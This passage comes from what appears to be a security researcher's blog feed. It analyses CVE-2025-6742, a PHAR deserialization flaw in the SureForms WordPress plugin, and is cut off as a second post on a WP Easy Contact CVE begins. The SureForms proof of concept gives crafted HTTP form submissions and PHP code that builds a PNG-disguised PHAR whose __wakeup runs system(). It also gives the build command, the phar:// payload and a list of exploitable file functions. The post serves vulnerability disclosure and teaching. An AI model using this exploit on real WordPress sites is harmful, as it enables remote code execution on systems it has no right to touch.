Form&lt;/h2&gt;&lt;p&gt;Create form&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;998&#34; width=&#34;1343&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create form&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Create a post and embed the form shortcode:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#34; title=&#34;Embed Shortcode&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/embed.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed&lt;/h2&gt;&lt;p&gt;Embed Shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#39; alt=&#34;Embed&#34; height=&#34;507&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Embed Shortcode&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Access the created form and submit arbitrary data:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/2025/11/19/form-testing/&#xA;X-WP-Nonce: 2c506366a5&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Length: 730&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-3=1763365761&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&#xA;d3b9273370&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&#xA;/2025/11/19/form-testing/&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;form-id&amp;#34;&#xA;&#xA;123&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field&amp;#34;&#xA;&#xA;testing&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#34; title=&#34;Submit form from Unauthenticated user&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/submit.png&#34; data-sub-html=&#34;&lt;h2&gt;Capture request&lt;/h2&gt;&lt;p&gt;Submit form from Unauthenticated user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#39; alt=&#34;Capture request&#34; height=&#34;861&#34; width=&#34;1496&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Submit form from Unauthenticated user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The response returns several fields such as &lt;strong&gt;status&lt;/strong&gt; and &lt;strong&gt;submission id&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The name &lt;code&gt;delete_entry_files&lt;/code&gt; refers to deleting an entry, so let’s set a breakpoint at the start of the function and try deleting an entry.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; title=&#34;Debugger when entry is deleted&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; data-sub-html=&#34;&lt;h2&gt;Entry Delete&lt;/h2&gt;&lt;p&gt;Debugger when entry is deleted&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#39; alt=&#34;Entry Delete&#34; height=&#34;1082&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger when entry is deleted&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Continue debugging&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#34; title=&#34;Value of $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Value of $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#39; alt=&#34;Value&#34; height=&#34;747&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We see &lt;code&gt;$value&lt;/code&gt; is attacker-controlled. &lt;code&gt;$value&lt;/code&gt; needs to be an array so it won’t be skipped by &lt;code&gt;continue&lt;/code&gt; and so &lt;code&gt;file_exists()&lt;/code&gt; can be invoked.&lt;/p&gt;&#xA;&lt;p&gt;To make &lt;code&gt;$value&lt;/code&gt; an array, submit a field whose name ends with &lt;code&gt;[]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&#xA;testing&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#34; title=&#34;Value of $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value1.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Value of $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#39; alt=&#34;Value&#34; height=&#34;891&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;After debugging, we can see the execution flow to the sink:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client submit form&amp;#34;] &#xA;    --&amp;gt; B[&amp;#34;Admin delete entry&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WordPress hook: admin_init&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;handle_entry_actions&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Entries_List_Table::handle_entry_status()&amp;#34;]&#xA;E -- $action=delete --&amp;gt; F[&amp;#34;Entries_List_Table::delete_entry_files()&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;$value is array&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;call file_exists( $file_path )&amp;#34;] --&amp;gt; L[&amp;#34;RCE: PHAR Deserialization&amp;#34;]&#xA;G -- No --&amp;gt; K[&amp;#34;continue&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use an admin account to create a form and insert it into a post&lt;/li&gt;&#xA;&lt;li&gt;Create a PHP file &lt;code&gt;create_phar.php&lt;/code&gt; with the following code:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;// Define class Evil with a property and __wakeup function&#xA;class Evil&#xA;{&#xA;    // Property command contains the system command to be executed&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;&#xA;    // __wakeup() is triggered when this object is unserialized&#xA;    public function __wakeup(): void&#xA;    {&#xA;        // When unserialized, execute the command in $command and terminate program&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&#xA;&#xA;// Create a new PHAR file named poc.phar&#xA;$phar = new Phar(&amp;#39;poc.phar&amp;#39;);&#xA;&#xA;// Begin writing PHAR contents&#xA;$phar-&amp;gt;startBuffering();&#xA;&#xA;// Add a fake entry named test.png with content &amp;#34;text&amp;#34;&#xA;$phar-&amp;gt;addFromString(&amp;#39;test.png&amp;#39;, &amp;#39;text&amp;#39;);&#xA;&#xA;// Set PHAR stub beginning with PNG magic bytes to disguise it as an image,&#xA;// then __HALT_COMPILER() to end execution&#xA;$phar-&amp;gt;setStub(&amp;#34;\x89PNG\r\n\x1a\n&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;);&#xA;&#xA;// Write metadata containing an Evil object&#xA;$phar-&amp;gt;setMetadata(new Evil());&#xA;&#xA;// Finish writing and flush to file&#xA;$phar-&amp;gt;stopBuffering();&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Create the PHAR file &lt;code&gt;poc.phar&lt;/code&gt; by running:&lt;br&gt;&#xA;&lt;code&gt;php --define phar.readonly=0 create_phar.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;phar.readonly&lt;/code&gt; is a directive in PHP (Phar extension configuration). By default its value is 1 (readonly) and PHAR files cannot be created. To generate PHAR files, disable readonly using &lt;code&gt;phar.readonly=0&lt;/code&gt; or configure it in &lt;code&gt;php.ini&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Rename &lt;code&gt;poc.phar&lt;/code&gt; to &lt;code&gt;poc.png&lt;/code&gt; since file uploads typically only accept images rather than &lt;code&gt;.phar&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Upload &lt;code&gt;poc.jpg&lt;/code&gt; using the Media Editor. Take note of its upload path in &lt;code&gt;wp-content/uploads&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Resend the form submission request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/2025/11/19/form-testing/&#xA;X-WP-Nonce: 2c506366a5&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Length: 775&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-3=1763365761&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&#xA;d3b9273370&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&#xA;/2025/11/19/form-testing/&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;form-id&amp;#34;&#xA;&#xA;123&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&#xA;phar://../wp-content/uploads/2025/11/poc.png&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;When the admin deletes the entry&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#34; title=&#34;RCE when admin deletes entry&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE when admin deletes entry&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1486&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE when admin deletes entry&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;After testing multiple PHP versions, I found that: The function &lt;code&gt;file_exists()&lt;/code&gt; only works for PHAR exploitation on versions &lt;code&gt;&amp;lt;=7.4&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Some other functions usable for PHAR Deserialization exploitation:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;copy                file_exists         file_get_contents   file_put_contents   &#xA;file                fileatime           filectime           filegroup           &#xA;fileinode           filemtime           fileowner           fileperms           &#xA;filesize            filetype            fopen               is_dir              &#xA;is_executable       is_file             is_link             is_readable         &#xA;is_writable         lstat               mkdir               parse_ini_file      &#xA;readfile            rename              rmdir               stat                &#xA;touch               unlink  &lt;/code&gt;&lt;/pre&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;The &lt;strong&gt;PHP Object Injection vulnerability in SureForm &amp;lt;= 1.7.3&lt;/strong&gt; originates from using &lt;code&gt;file_exists()&lt;/code&gt; and &lt;code&gt;unlink()&lt;/code&gt; directly on a user-controlled path without scope constraints. Although the plugin does not contain a POP chain by default, if additional plugins or themes installed in the environment contain a POP chain, attackers may escalate exploitation to deleting files, reading sensitive data, or even executing arbitrary code (RCE). The 1.7.4 patch handles the issue by normalizing and restricting valid file paths into the upload directory, eliminating the exploitation vector.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;The vulnerability originates from interacting with filesystem paths derived directly from uncontrolled user input.&lt;/li&gt;&#xA;&lt;li&gt;Using only &lt;code&gt;file_exists()&lt;/code&gt; can lead to PHAR deserialization on PHP versions ≤7.4.&lt;/li&gt;&#xA;&lt;li&gt;Although the plugin has no built-in POP chain, typical WordPress environments host many plugins → high likelihood of chainability.&lt;/li&gt;&#xA;&lt;li&gt;The patch adds path normalization, upload directory restrictions, and avoids directly interacting with filesystem paths.&lt;/li&gt;&#xA;&lt;li&gt;File operation functions always pose exploitation risk if user inputs are not strongly validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/sureforms/vulnerability/wordpress-sureforms-plugin-1-7-3-unauthenticated-php-object-injection-phar-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin &amp;lt;= 1.7.3 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-18-cve-2025-53572/</link>
      <pubDate>Tue, 18 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-18-cve-2025-53572/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; vulnerability in &lt;strong&gt;emarket-design WP Easy Contact&lt;/strong&gt; allows &lt;strong&gt;Object Injection&lt;/strong&gt;.&#xA;This issue affects &lt;strong&gt;WP Easy Contact&lt;/strong&gt;: from &lt;em&gt;n/a&lt;/em&gt; to &lt;strong&gt;4.0.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-easy-contact/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 